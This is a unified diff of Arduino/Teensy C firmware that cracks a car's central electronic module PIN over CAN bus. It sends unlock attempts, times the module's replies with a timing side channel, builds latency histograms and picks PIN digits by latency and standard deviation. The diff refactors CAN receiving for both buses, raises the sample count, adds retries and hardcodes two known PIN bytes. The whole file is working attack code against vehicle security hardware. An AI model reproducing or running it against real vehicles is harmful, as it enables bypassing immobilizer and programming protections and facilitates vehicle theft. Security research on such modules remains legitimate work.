@@ -101,7 +101,7 @@ uint8_t platform = PLATFORM_UNKNOWN;
 volatile uint8_t operatingState = STATE_IDLE;
 
 #define HAS_CAN_LS          /* in the vehicle both low-speed and high-speed CAN-buses need to go into programming mode */
-#define SAMPLES        25   /* number of samples per sequence, more is better (up to 100) (10 samples = ~3 minutes)*/
+#define SAMPLES        100   /* number of samples per sequence, more is better (up to 100) (10 samples = ~3 minutes)*/
 #define CALC_BYTES     3    /* how many PIN bytes to calculate (1 to 4), the rest is brute-forced */
 #define NUM_LOOPS      2000 /* how many loops to do when calculating crack rate */
 
@@ -372,26 +372,28 @@ void canMsgSend (can_bus_id_t bus, uint32_t id, uint8_t *data, bool verbose)
 
 /* storage for message received via event */
 
-CAN_message_t eventMsg;
-bool eventMsgAvailable = false;
-
-/*******************************************************************************
-
-   canHsEvent - FlexCAN_T4's message receive call-back
-
-   Returns: N/A
-*/
-
-void canHsEvent (const CAN_message_t &msg)
-{
-
-  /* just save the message in a global and flag it as available */
-
-  eventMsg = msg;
-  eventMsgAvailable = true;
-}
 
 #endif /* HW_SELECTION */
+
+
+
+CAN_message_t can_hs_event_msg;
+CAN_message_t can_ls_event_msg;
+volatile bool can_hs_event_msg_available = false;
+volatile bool can_ls_event_msg_available = false;
+
+void can_hs_event (const CAN_message_t &msg)
+{
+  can_hs_event_msg = msg;
+  can_hs_event_msg_available = true;
+}
+
+void can_ls_event (const CAN_message_t &msg)
+{
+  can_ls_event_msg = msg;
+  can_ls_event_msg_available = true;
+}
+
 
 /*******************************************************************************
 
@@ -402,98 +404,54 @@ void canHsEvent (const CAN_message_t &msg)
    Returns: true if a message was available, false otherwise
 */
 
-bool canMsgReceive (uint32_t *id, uint8_t *data, bool wait, bool verbose)
+bool canMsgReceive (can_bus_id_t bus, uint32_t *id, uint8_t *data, int wait, bool verbose)
 {
   uint8_t *pData;
   uint32_t canId = 0;
   bool     ret = false;
-  //uint32_t start, timeout = 3000;
-
-  //start = TSC;
-
-#if (HW_SELECTION == MCP2515_HW)
-  uint8_t msg[CAN_MSG_SIZE] = { 0 };
-
-  do {
-    uint8_t len, rcvStat;
-
-    /* poll if a message is available */
-
-    rcvStat = CAN_HS.checkReceive ();
-    //printf("Read status: %d\n", rcvStat);
-    ret = (rcvStat == CAN_MSGAVAIL);
-    if (ret == true) {
-
-      /* retrieve available message and return it */
-
-      CAN_HS.readMsgBuf (&len, msg);
-      canId = CAN_HS.getCanId ();
-      pData = msg;
-    }
-    //else printf ("wait\n");
-
-
-    if(operatingState == STATE_INTERRUPT_REQUESTED)
-    {
-        wait = false;
-    }
-    
-    //if(TSC-start > timeout) wait=false;
-
-
-  } while ((ret == false) && (wait == true));
-
-#elif (HW_SELECTION == TEENSY_CAN_HW)
+  volatile bool &msg_avail = (bus == CAN_HS ? can_hs_event_msg_available : can_ls_event_msg_available);
+  CAN_message_t &msg = (bus == CAN_HS ? can_hs_event_msg : can_ls_event_msg);
 
   do {
 
     /* call FlexCAN_T4's event handler to process queued messages */
 
-    can_hs.events ();
+    bus == CAN_HS ? can_hs.events() : can_ls.events();
 
     /* check if a message was available and process it */
 
-    if (eventMsgAvailable == true) {
+    if (msg_avail) {
 
       /* process the global buffer set by can_hs.events */
 
-      eventMsgAvailable = false;
-      canId = eventMsg.id;
-      pData = eventMsg.buf;
+      msg_avail = false;
+      canId = msg.id;
+      pData = msg.buf;
       ret = true;
+    } else {
+      delay(1);
+      wait--;
     }
-
-    if(operatingState == STATE_INTERRUPT_REQUESTED)
-    {
-        wait = false;
-    }
-
-    //if(TSC-start > timeout) wait=false;
-    
-  } while ((ret == false) && (wait == true));
-
-#endif /* HW_SELECTION */
+  } while (!ret && wait);
 
   /* no message, just return an error */
 
-  if (ret == false) {
+  if (!ret)
     return ret;
-  }
 
   /* save data to the caller if they provided buffers */
 
-  if (id != NULL) {
+  if (id)
     *id = canId;
-  }
 
-  if (data != NULL) {
-    memcpy (data, pData, CAN_MSG_SIZE);
-  }
+  if (data)
+    memcpy(data, pData, CAN_MSG_SIZE);
 
   /* print the message we received */
 
-  if (verbose == true) {
-    printf ("<--- ID=%08x data=%02x %02x %02x %02x %02x %02x %02x %02x\n",
+  if (verbose) {
+    printf ("CAN_%cS <--- ID=%08x data=%02x %02x %02x %02x %02x %02x %02x %02x\n",
+            bus == CAN_HS ? 'H' : 'L',
             canId, pData[0], pData[1], pData[2], pData[3], pData[4], pData[5], pData[6], pData[7]);
   }
 
@@ -525,6 +483,22 @@ uint8_t bcdToBin (uint8_t value)
 }
 
 
+
+
+/*******************************************************************************
+
+   seq_max_lat - helper function for qaort lat deviation
+
+   Returns: number of PINs processed per second
+*/
+
+int seq_max_lat(const void *a, const void *b)
+{
+  sequence_t *_a = (sequence_t *)a;
+  sequence_t *_b = (sequence_t *)b;
+
+  return _b->latency - _a->latency;
+}
 
 /*******************************************************************************
 
@@ -647,10 +621,7 @@ bool cemUnlock (uint8_t *pin, uint8_t *pinUsed, uint32_t *latency, bool verbose)
   uint8_t *pMsgPin = unlockMsg + 2;
   uint32_t start, end, limit;
   uint32_t id;
-  uint32_t sampleCount;
-  uint32_t maxSample = 0;
   uint32_t maxTime = 0;
-  bool     replyWait = true;
 
   /* shuffle the PIN and set it in the request message */
 
@@ -664,10 +635,10 @@ bool cemUnlock (uint8_t *pin, uint8_t *pinUsed, uint32_t *latency, bool verbose)
 
   /* maximum time to collect our samples */
 
-  limit = millis () + CEM_REPLY_TIMEOUT_MS;
-
+  //limit = millis () + CEM_REPLY_TIMEOUT_MS;
+  limit = TSC + CEM_REPLY_TIMEOUT_MS * 1000 * clockCyclesPerMicrosecond();
+  
   /* clear current interrupt status */
-
   canInterruptReceived = false;
 
   //buttonTimer.end();
@@ -678,81 +649,62 @@ bool cemUnlock (uint8_t *pin, uint8_t *pinUsed, uint32_t *latency, bool verbose)
   //end = TSC;
   //printf("Transmission time: %d\n", end-start);
 
-  /*
-     Sample the CAN bus and determine the longest time between bit transitions.
+  start = end = TSC;
+  
+  while(
+            (canInterruptReceived == false) // &&
+           // (maxTime < CEM_REPLY_US * clockCyclesPerMicrosecond ())
+       ) {
 
-     The measurement is done in parallel with the CAN controller transmitting the
-     CEM unlock message.  The longest time will occur between the end of message
-     transmission (acknowledge slot bit) of the current message and the start of
-     frame bit of the CEM's reply.
-
-     The sampling terminates when any of the following conditions occurs:
-      - the CAN controller generates an interrupt from a received message
-      - a measured time between bits is greater than the expected CEM reply time
-      - a timeout occurs due to no bus activity
-  */
+        
+            if( TSC >= limit )
+            {
+                //printf("\nERROR: CEM reply timeout reached!\n");
+                break;
+            }
 
 
-  for (sampleCount = 0, start = TSC;
-       (canInterruptReceived == false) &&
-       (millis () < limit) &&
-       (maxTime < CEM_REPLY_US * clockCyclesPerMicrosecond ())
-       ;) {
-
-    /* if the line is high, the CAN bus is either idle or transmitting a bit */
-
-    if (digitalRead (CAN_L_PIN) == 1) {
-
-      /* count how many times we've seen the bus in a "1" state */
-#if (DEBUG_LATENCY==1)
-        if( DEBUG_LATENCY_ENABLED==1)
-        {
-          printf("A");
+        /* if the line is high, the CAN bus is either idle or transmitting a bit */
+    
+        if (digitalRead (CAN_L_PIN)) {
+    
+          /* count how many times we've seen the bus in a "1" state */
+            #if (DEBUG_LATENCY==1)
+                    if( DEBUG_LATENCY_ENABLED==1)
+                    {
+                      printf("A");
+                    }
+            #endif
+          continue;
         }
-#endif
-      sampleCount++;
-      continue;
+    
+        /* the CAN bus isn't idle, it's the start of the next bit */
+    
+        end = TSC;
+    
+          /* track the time in clock cycles */
+    
+        if (end - start > maxTime)
+          maxTime = end - start;
+          //printf("TIME: %d - %d = %d (%d ticks) \n", start, end, maxTime);
+    
+        #if DEBUG_LATENCY==1
+            /* wait for the current transmission to finish before sampling again */
+        
+            while (digitalRead (CAN_L_PIN) == 0) 
+            {
+                if( DEBUG_LATENCY_ENABLED==1)
+                {
+                      printf("_");
+                }
+            }
+        #endif
+        /* start of the next sample */
+    
+    
+          start = end;
+
     }
-
-    /* the CAN bus isn't idle, it's the start of the next bit */
-
-    end = TSC;
-
-    /* we only need to track the longest time we've seen */
-
-    if (sampleCount > maxSample) {
-      maxSample = sampleCount;
-      sampleCount = 0;
-
-      /* track the time in clock cycles */
-
-      maxTime = end - start;
-      //printf("TIME: %d - %d = %d (%d ticks) \n", start, end, maxTime, maxSample);
-
-    }
-
-    /* wait for the current transmission to finish before sampling again */
-
-    while (digitalRead (CAN_L_PIN) == 0) {
-
-#if DEBUG_LATENCY==1
-    if( DEBUG_LATENCY_ENABLED==1)
-    {
-          printf("_");
-    }
-#endif
-
-      /* abort if we've hit our timeout */
-      if (millis () >= limit) {
-        break;
-      }
-    }
-
-    /* start of the next sample */
-
-    start = TSC;
-    sampleCount = 0;
-  }
 
   //buttonTimer.begin(buttonTimerHandler, 1000000/TICKS_PER_SECOND);  // check button state every XX second
 
@@ -763,26 +715,11 @@ bool cemUnlock (uint8_t *pin, uint8_t *pinUsed, uint32_t *latency, bool verbose)
       if (canInterruptReceived == true) printf("Exit on interrupt\n");
       if (millis () >= limit) printf("Exit on limit (%d)\n", limit);
       if (maxTime >= CEM_REPLY_US * clockCyclesPerMicrosecond ()) printf("Exit on timeout\n");
-      printf("Ticks: %d, Latency: %d\n", maxSample, maxTime);
+      printf("Latency: %d\n", maxTime);
     }
 #endif
 
 
-
-  /* check for a timeout condition */
-
-  if (millis () >= limit) {
-    printf ("Timeout waiting for CEM reply!\n");
-
-    /* additional time in case there is sth to process */
-    delay (1000);
-    
-    //while(1);
-
-    /* on a timeout, try and see if there is anything in the CAN Rx queue */
-
-    replyWait = false;
-  }
 
   /* default reply is set to indicate a failure */
 
@@ -791,7 +728,7 @@ bool cemUnlock (uint8_t *pin, uint8_t *pinUsed, uint32_t *latency, bool verbose)
 
   /* see if anything came back from the CEM */
 
-  (void) canMsgReceive (&id, reply, replyWait, verbose);
+  (void) canMsgReceive (CAN_HS, &id, reply, 1000, verbose);
 
   /* return the maximum time between transmissions that we saw on the CAN bus */
 
@@ -836,7 +773,7 @@ void ecuPrintPartNumber (uint8_t ecuId)
   /* get the reply */
 
   memset (data, 0, sizeof(data));
-  (void) canMsgReceive (&id, data, true, verbose);
+  (void) canMsgReceive (CAN_HS, &id, data, 1000, verbose);
 
   printf ("Part Number: %02u%02u%02u%02u\n",
           bcdToBin (data[4]), bcdToBin (data[5]),
@@ -977,7 +914,7 @@ void identifyPlatform (void)
     id=0;
     while( (id&0x3) != 0x3)
     {
-        if(canMsgReceive (&id, data, true, verbose))
+        if(canMsgReceive (CAN_HS, &id, data, 1000, verbose))
         {
             if(verbose) printf("ID: 0x%x 0x%x\n", id, id&0x3);
         }
@@ -1017,7 +954,7 @@ void identifyPlatform (void)
             id=0;
             while( (id&0x3) != 0x3) 
             {
-                canMsgReceive (&id, data, true, verbose);
+                canMsgReceive (CAN_HS, &id, data, 1000, verbose);
                 if( operatingState != STATE_INITIALIZING ) return;
             }
             memcpy(CONFIG_P1_data+CONFIG_P1_len,data+1,sizeof(uint8_t)*7);
@@ -1143,7 +1080,7 @@ void getConfig (void)
         len = (i==0?4:7);
         while( (id&0x3) != 0x3) 
         {
-            canMsgReceive (&id, data, true, verbose);
+            canMsgReceive (CAN_HS, &id, data, 1000, verbose);
             if( operatingState != STATE_INITIALIZING ) return;
         }
         memcpy(CONFIG_P2_data+CONFIG_P2_len,data+(8-len),sizeof(uint8_t)*len);
@@ -1169,7 +1106,7 @@ bool getMemoryChecksum(uint8_t &cs, uint32_t start_addr, uint32_t end_addr, bool
 
     // set start address for 
     canMsgSend (CAN_HS, 0xffffe, data_org, verbose);
-    canMsgReceive (&id, data_rcv, true, verbose);
+    canMsgReceive (CAN_HS, &id, data_rcv, 1000, verbose);
     if(data_rcv[1] != 0x9C) return false;
 
     delay(100);
@@ -1181,7 +1118,7 @@ bool getMemoryChecksum(uint8_t &cs, uint32_t start_addr, uint32_t end_addr, bool
 
     // send end address and get CS 
     canMsgSend (CAN_HS, 0xffffe, data_cs, verbose);
-    canMsgReceive (&id, data_rcv, true, verbose);
+    canMsgReceive (CAN_HS, &id, data_rcv, 1000, verbose);
     if(data_rcv[1] != 0xB1) return false;
 
     cs = data_rcv[2];
@@ -1206,7 +1143,7 @@ bool loadBootloaderPart(uint8_t part, bool verbose)
 
     // set start address
     canMsgSend (CAN_HS, 0xffffe, data_org, verbose);
-    canMsgReceive (&id, data_rcv, true, verbose);
+    canMsgReceive (CAN_HS, &id, data_rcv, 1000, verbose);
     if(data_rcv[1] != 0x9C) return false;
 
     // send payload
@@ -1263,12 +1200,12 @@ bool executeSBL(bool verbose)
       
       // set start address
       canMsgSend (CAN_HS, 0xffffe, data_org, verbose);
-      canMsgReceive (&id, data_rcv, true, verbose);
+      canMsgReceive (CAN_HS, &id, data_rcv, 1000, verbose);
       if(data_rcv[1] != 0x9C) return false;
 
       // set start address
       canMsgSend (CAN_HS, 0xffffe, data_jsr, verbose);
-      canMsgReceive (&id, data_rcv, true, verbose);
+      canMsgReceive (CAN_HS, &id, data_rcv, 1000, verbose);
       if(data_rcv[1] != 0xA0) return false;
 
       delay(100);
@@ -1395,20 +1332,6 @@ bool verifyConfigurationCS()
     return true;
 }
 
-/*******************************************************************************
-
-   seq_max - quicksort comparison function to find highest latency
-
-   Returns: integer less than zero, zero or greater than zero
-*/
-
-int seq_max (const void *a, const void *b)
-{
-  sequence_t *_a = (sequence_t *)a;
-  sequence_t *_b = (sequence_t *)b;
-
-  return _b->latency - _a->latency;
-}
 
 /*******************************************************************************
 
@@ -1419,40 +1342,30 @@ int seq_max (const void *a, const void *b)
 
 void crackPinPosition (uint8_t *pin, uint32_t pos, bool verbose)
 {
-  uint32_t histogram[CEM_REPLY_US];
+  int len = sizeof(uint32_t) * (cem_reply_max - cem_reply_min);
+  uint32_t *histogram = (uint32_t *)malloc(len);
   uint32_t latency;
   uint32_t prod;
   uint32_t sum;
   double std;
-  uint8_t  pin1;
-  uint8_t  pin2;
+  uint8_t  pin1, pin2;
   uint32_t i;
   uint32_t k;
-  uint32_t xmin = cem_reply_avg - HISTOGRAM_DISPLAY_MIN; // + AVERAGE_DELTA_MIN;
-  uint32_t xmax = cem_reply_avg + HISTOGRAM_DISPLAY_MAX; //AVERAGE_DELTA_MAX;
-
-  /* we process three digits in this code */
-
-  assert (pos <= (PIN_LEN - 3));
+  uint32_t xmin = cem_reply_avg - HISTOGRAM_DISPLAY_MIN;//AVERAGE_DELTA_MIN;
+  uint32_t xmax = cem_reply_avg + HISTOGRAM_DISPLAY_MAX;//AVERAGE_DELTA_MAX;
 
   /* clear collected latencies */
 
   memset (sequence, 0, sizeof(sequence));
 
-  /* print the latency histogram titles */
-  printf("           Delay (us): ");
-  for (k = 0; k < CEM_REPLY_US; k++) {
-    if ((k >= cem_reply_avg - HISTOGRAM_DISPLAY_MIN) &&
-        (k <= cem_reply_avg + HISTOGRAM_DISPLAY_MAX)) {
-      printf ("%3u ", k);
-    }
-  }
+  printf("                   us: ");
+  for (i = xmin; i < xmax; i++)
+    printf("%5d ", i);
   printf("\n");
 
   /* iterate over all possible values for the PIN digit */
 
   for (pin1 = 0; pin1 < 100; pin1++) {
-
     /* set PIN digit */
 
     pin[pos] = binToBcd (pin1);
@@ -1463,7 +1376,7 @@ void crackPinPosition (uint8_t *pin, uint32_t pos, bool verbose)
 
     /* show numerial values for the known digits */
 
-    for (i = 0; i <= pos; i++) {
+    for (i=0; i <= pos; i++) {
       printf ("%02x ", pin[i]);
     }
 
@@ -1478,7 +1391,7 @@ void crackPinPosition (uint8_t *pin, uint32_t pos, bool verbose)
 
     /* clear histogram data for the new PIN digit */
 
-    memset (histogram, 0, sizeof(histogram));
+    memset (histogram, 0, len);
 
     /* iterate over all possible values for the adjacent PIN digit */
 
@@ -1494,32 +1407,39 @@ void crackPinPosition (uint8_t *pin, uint32_t pos, bool verbose)
 
         /* iterate the next PIN digit (third digit) */
 
-        //pin[pos + 2] = binToBcd ((uint8_t)( random(0,255) & 0xff));
-        pin[pos + 2] = binToBcd ((uint8_t)( j & 0xff));
+        pin[pos + 2] = binToBcd ((uint8_t)j);
+
 
         /* try and unlock and measure the latency */
-
+        latency=0;
         cemUnlock (pin, NULL, &latency, verbose);
+        while ( latency < cem_reply_min)
+        {
+            printf("ERROR: CEM replied too quickly. Retrying after 1 sec...");
 
+            delay(500);
+            /* drain any pending messages */
+            while (canMsgReceive (CAN_HS, NULL, NULL, 1, false) == true)
+            ;
+            delay(500);
+            latency=0;
+            cemUnlock (pin, NULL, &latency, verbose);
+        }
+        
         /* calculate the index into the historgram */
 
-        uint32_t idx = latency / (clockCyclesPerMicrosecond () / BUCKETS_PER_US);
+        uint32_t idx = latency / clockCyclesPerMicrosecond();
 
-        if (idx >= CEM_REPLY_US) {
-          idx = CEM_REPLY_US - 1;
-        }
+        if (idx < cem_reply_min)
+          idx = cem_reply_min;
 
+        if (idx >= cem_reply_max)
+          idx = cem_reply_max - 1;
+
+        idx -= cem_reply_min;
         /* bump the count for this latency */
 
         histogram[idx]++;
-
-        
-        /* check if user didn't want to interrupt */
-        if(operatingState == STATE_INTERRUPT_REQUESTED)
-        {
-            return;
-        }
-
       }
     }
 
@@ -1527,104 +1447,69 @@ void crackPinPosition (uint8_t *pin, uint32_t pos, bool verbose)
 
     pin[pos + 1] = 0;
     pin[pos + 2] = 0;
+    pin[pos + 3] = 0;
 
     /* clear statistical values we're calculating */
 
     prod = 0;
     sum  = 0;
 
-
-
-    /* dump buckets for debug purposes */
-
-    if (DUMP_BUCKETS && platform == PLATFORM_P1)
-    {
-      printf ("Average latency: %u\n", cem_reply_avg);
-
-      for (k = 0; k < CEM_REPLY_US; k++) {
-        if (histogram[k] != 0) {
-          printf ("%4u : %5u\n", k, histogram[k]);
-        }
-      }
-    }
-
-    if (DUMP_BUCKETS && platform == PLATFORM_P2)
-    {
-      for (k = 0; k < CEM_REPLY_US; k++) {
-
-        /* print the latency histogram for relevant values */
-
-        if ((k >= cem_reply_avg - HISTOGRAM_DISPLAY_MIN) &&
-            (k <= cem_reply_avg + HISTOGRAM_DISPLAY_MAX)) {
-          printf ("%03u ", histogram[k]);
-        }
-      }
-    }
-
     /* loop over the histogram values */
 
-    for (k = 0 ; k < CEM_REPLY_US; k++) 
-    {
+    for (k = xmin; k < xmax; k++)
+      printf ("% 5u ", histogram[k - cem_reply_min]);
 
+    for (k = cem_reply_min; k < cem_reply_max; k++) {
+      int l = k - cem_reply_min;
+      uint32_t h = histogram[l];
 
-      /* verify limit in case parameters are wrong */
-
-      if (k > CEM_REPLY_US) {
-        continue;
+      if (h) {
+        prod += h * k;
+        sum  += h;
       }
-
-      /* print the latency histogram for relevant values */
-
-      if ((k >= (cem_reply_avg - HISTOGRAM_DISPLAY_MIN)) &&
-          (k <= (cem_reply_avg + HISTOGRAM_DISPLAY_MAX))) {
-        printf ("%03u ", histogram[k]);
-        //prod += histogram[k] * k;
-        //sum  += histogram[k];
-      }
-
-      /* calculate weighted count and total of all entries */
-
-
-        prod += histogram[k] * k;
-        sum  += histogram[k];
-
     }
-
 
     int mean = sum / (xmax - xmin);
     long x = 0;
 
-    for (unsigned int k = cem_reply_min; k < cem_reply_max; k++) 
-    {
+    for (unsigned int k = cem_reply_min; k < cem_reply_max; k++) {
       int l = k - cem_reply_min;
-      x += sq(histogram[l] - mean);
+      if (histogram[l])
+        x += sq(histogram[l] - mean);
     }
-    std = sqrt((double)x / (xmax - xmin));
+    std = sqrt((double)x / (cem_reply_max - cem_reply_min));
 
     /* weighted average */
 
-    printf ("|  lat. % 7u, std %3.2f\n", prod, std);
+    printf (": lat % 8u; std %3.2f\n", prod, std);
 
     /* store the weighted average count for this PIN value */
 
     sequence[pin1].pinValue = pin[pos];
     sequence[pin1].latency  = prod;
-    sequence[pin1].sum  = sum;
     sequence[pin1].std  = std;
 
 
+#if defined(DUMP_BUCKETS)
+    printf ("Average latency: %u\n", cem_reply_avg);
 
+    for (k = 0; k < cem_reply_max - cem_reply_min; k++) {
+      if (histogram[k] != 0) {
+        printf ("%4u : %5u\n", k + cem_reply_min, histogram[k]);
+      }
+    }
+#endif
 
   }
 
   /* sort the collected sequence of latencies */
 
-  qsort (sequence, 100, sizeof(sequence_t), seq_max);
+  qsort (sequence, 100, sizeof(sequence_t), seq_max_lat);
 
-  /* print the top 10 and last 5 latencies and their PIN value */
-
-  for (uint32_t i = 0; i < 10; i++) {
-    printf ("% 2u: %02x = %u\n", i, sequence[i].pinValue, sequence[i].latency);
+  /* print the top 25 latencies and their PIN value */
+  printf("best candidates ordered by latency:\n");
+  for (uint32_t i = 0; i < 5; i++) {
+    printf ("%u: %02x lat = %u\n", i, sequence[i].pinValue, sequence[i].latency);
   }
   printf("...\n");
   for (uint32_t i = 95; i < 100; i++) {
@@ -1634,35 +1519,19 @@ void crackPinPosition (uint8_t *pin, uint32_t pos, bool verbose)
   double lat_k_98_99 = 100.0 * (sequence[98].latency - sequence[99].latency) / sequence[99].latency;
   double lat_k_0_99  = 100.0 * (sequence[0].latency - sequence[99].latency) / sequence[99].latency;
 
-  /* choose the PIN value that has the highest latency */
-
-  printf ("pin[%u] candidate: %02x with latency %u\n", pos, sequence[0].pinValue, sequence[0].latency);
-
-
-
-  /* print a warning message if the top two are close, we might be wrong */
-
-  if ((sequence[0].latency - sequence[1].latency) < clockCyclesPerMicrosecond ()) {
-    printf ("Warning: Selected candidate is very close to the next candidate!\n");
-    printf ("         Selection may be incorrect.\n");
-  }
-
-
-
   /* set the digit in the overall PIN */
 
   pin[pos] = sequence[0].pinValue;
   pin[pos + 1] = 0;
-
+  pin[pos + 2] = 0;
 
   qsort (sequence, 100, sizeof(sequence_t), seq_max_std);
 
-
-/* print the top 10 and last 5 std deviations and their PIN value */
+  /* print the top 25 latencies and their PIN value */
 
   printf("\nbest candidates ordered by std:\n");
-  for (uint32_t i = 0; i < 10; i++) {
-    printf ("% 2u: %02x std = %3.2f\n", i, sequence[i].pinValue, sequence[i].std);
+  for (uint32_t i = 0; i < 5; i++) {
+    printf ("%u: %02x std = %3.2f\n", i, sequence[i].pinValue, sequence[i].std);
   }
   printf("...\n");
   for (uint32_t i = 95; i < 100; i++) {
@@ -1671,15 +1540,31 @@ void crackPinPosition (uint8_t *pin, uint32_t pos, bool verbose)
   double std_k_0_1   = 100.0 * (sequence[0].std - sequence[1].std) / sequence[1].std;
   double std_k_98_99 = 100.0 * (sequence[98].std - sequence[99].std) / sequence[99].std;
   double std_k_0_99  = 100.0 * (sequence[0].std - sequence[99].std) / sequence[99].std;
-  printf ("pin[%u] candidate: %02x with standard deviation %u\n", pos, sequence[0].pinValue, sequence[0].std);
-
-  printf("\nlat_k 0-1 %3.2f%%, lat_k 98-99 %3.2f%%, lat_k 0-99 %3.2f%%\n", lat_k_0_1, lat_k_98_99, lat_k_0_99);
-  printf("std_k 0-1 %3.2f%%, std_k 98-99 %3.2f%%, std_k 0-99 %3.2f%%\n", std_k_0_1, std_k_98_99, std_k_0_99);
 
 
+  printf("\nlat_k(0-1)=%3.2f%%, lat_k(98-99)=%3.2f%%, lat_k(0-99)=%3.2f%%\n", lat_k_0_1, lat_k_98_99, lat_k_0_99);
+  printf("std_k(0-1)=%3.2f%%, std_k(98-99)=%3.2f%%, std_k(0-99)=%3.2f%%\n", std_k_0_1, std_k_98_99, std_k_0_99);
 
-  printf("Average response: %d\n", cem_reply_avg);
+  if (lat_k_0_99 > std_k_0_99) {
+    printf("Latency has more deviation than STD\n");
+    /* choose the PIN value that has the highest latency */
+    printf ("pin[%u] choose candidate: %02x based on latency\n", pos, pin[pos]);
+  } else {
+    printf("STD has more deviation than latency\n");
+    if (std_k_0_1 > std_k_98_99) {
+      printf("STD[0] deviates more than STD[99]\n");
+      pin[pos] = sequence[0].pinValue;
+    } else {
+      printf("STD[99] deviates more than STD[0]\n");
+      pin[pos] = sequence[99].pinValue;
+    }
+    printf ("pin[%u] choose candidate: %02x based on std\n", pos, pin[pos]);
+  }
+
+  free(histogram);
 }
+
+
 
 /*******************************************************************************
 
@@ -1714,8 +1599,12 @@ void cemCrackPin (uint32_t maxBytes, bool verbose)
   memset (pin, 0, sizeof(pin));
 
   /* try and crack each PIN position */
+//  pin[0] = 0x18;
+//  pin[1] = 0x09;
+  pin[0] = 0x07;
+  pin[1] = 0x57;
 
-  for (uint32_t i = 0; i < maxBytes; i++) {
+  for (uint32_t i = 2; i < maxBytes; i++) {
 
     /* profile the CEM to see how fast it can process requests */
 
@@ -1842,7 +1731,7 @@ void cemCrackPin (uint32_t maxBytes, bool verbose)
 
     memset (data, 0, sizeof(data));
 
-    (void) canMsgReceive (&can_id, data, true, false);
+    (void) canMsgReceive (CAN_HS, &can_id, data, 1000, false);
 
     /* verify the response came from the CEM and is a successful reply to our request */
 
@@ -1914,7 +1803,7 @@ void flexCanInit (void)
   can_hs.setFIFOFilter(0, 0x3, EXT);
   can_hs.setFIFOFilter(1, 0x1200003, EXT); // P2
   can_hs.setFIFOFilter(2, 0x400003, EXT);  // P1
-  can_hs.onReceive (canHsEvent);
+  can_hs.onReceive (can_hs_event);
   printf ("CAN high-speed init done.\n");
 
 #if defined(SHOW_CAN_STATUS)
@@ -1927,6 +1816,7 @@ void flexCanInit (void)
   can_ls.begin ();
   can_ls.setBaudRate (CAN_LS_BAUD);
   can_ls.enableFIFO();
+  can_ls.onReceive (can_ls_event);
   printf ("CAN low-speed init done.\n");
 
 #if defined(SHOW_CAN_STATUS)
@@ -2128,7 +2018,7 @@ void loop (void)
     
       printf("\n");
       /* drain any pending messages */
-      while (canMsgReceive (NULL, NULL, false, false) == true)
+      while (canMsgReceive (CAN_HS, NULL, NULL, 1, false) == true)
         ;
       if( operatingState != STATE_INITIALIZING) 
       {
@@ -2139,7 +2029,7 @@ void loop (void)
       progModeOn ();
     
       /* drain any pending messages */
-      while (canMsgReceive (NULL, NULL, false, false) == true)
+      while (canMsgReceive (CAN_HS, NULL, NULL, 1, false) == true)
         ;
     
       /* print the CEM's part number */
